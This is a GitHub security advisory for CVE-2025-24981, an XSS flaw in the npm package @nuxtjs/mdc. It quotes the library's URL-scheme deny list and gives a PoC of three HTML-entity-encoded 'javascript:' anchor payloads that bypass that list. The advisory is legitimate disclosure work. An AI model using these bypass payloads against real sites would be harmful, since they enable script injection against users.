# [C] Parsed HTML anchor links in Markdown provided to parseMarkdown can result in XSS in @nuxtjs/mdc

## Summary
Severity: Critical
Advisory: GHSA-j82m-pc2v-2484
CVE: CVE-2025-24981
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:L (CVSS_V3)
Published: 2025-02-06
Source: https://github.com/advisories/GHSA-j82m-pc2v-2484
Type: github-advisory

## Affected
- npm: `@nuxtjs/mdc` — affected >=0 <0.13.3

## Details
### Summary
An unsafe parsing logic of the URL from markdown can lead to arbitrary JavaScript code due to a bypass to the existing guards around the `javascript:` protocol scheme in the URL.

### Details

The parsing logic implement at [https://github.com/nuxt-modules/mdc/blob/main/src/runtime/parser/utils/props.ts#L16](https://github.com/nuxt-modules/mdc/blob/main/src/runtime/parser/utils/props.ts#L16) maintains a deny-list approach to filtering potential malicious payload. It does so by matching protocol schemes like `javascript:` and others.

Specifically, this is the code from the mdc library's parser that is not secure enough:

```js
export const unsafeLinkPrefix = [
  'javascript:',
  'data:text/html',
  'vbscript:',
  'data:text/javascript',
  'data:text/vbscript',
  'data:text/css',
  'data:text/plain',
  'data:text/xml'
]

export const validateProp = (attribute: string, value: string) => {
  if (attribute.startsWith('on')) {
    return false
  }

  if (attribute === 'href' || attribute === 'src') {
    return !unsafeLinkPrefix.some(prefix => value.toLowerCase().startsWith(prefix))
  }

  return true
}
```

These security guards can be bypassed by an adversarial that provides JavaScript URLs with HTML entities encoded via hex string.

### PoC

The following URL payloads if provided to the markdown parsing library (such as through the usage of `import { parseMarkdown } from '@nuxtjs/mdc/runtime';`) will trigger the alert() dialog:

```markdown
# ✅ This is correctly escaped by the parser

- XSS Attempt:

<a href="javascript:alert(1)"> this gets sanitizied, yay!</a>

# ❌ These are vulnerable and not escaped

- Bypass 1:

<a href="jav&#x09;ascript:alert('XSS');">Click Me 1</a>

- Bypass 2:

<a href="jav&#x0A;ascript:alert('XSS');">Click Me 2</a>

- Bypass 3:

<a href="jav&#10;ascript:alert('XSS');">Click Me 3</a>
```

### Impact

Users who consume this library and perform markdown parsing from unvalidated sources such as LLM generative text responses, user input and other untrusted sources could result in rendering vulnerable XSS anchor links.

## Reference

You may infer the following write-up for more in-depth walkthrough of URL parsing problems and suggestions on how to securely address them: [How to Parse URLs from Markdown to HTML Securely?](https://www.nodejs-security.com/blog/how-to-parse-urls-from-markdown-to-html-securely)

## References
- https://github.com/nuxt-modules/mdc/security/advisories/GHSA-j82m-pc2v-2484
- https://nvd.nist.gov/vuln/detail/CVE-2025-24981
- https://github.com/nuxt-modules/mdc/commit/99097738b5561639e9bf247c55d8103236618bf3
- https://github.com/nuxt-modules/mdc
- https://github.com/nuxt-modules/mdc/blob/main/src/runtime/parser/utils/props.ts#L16
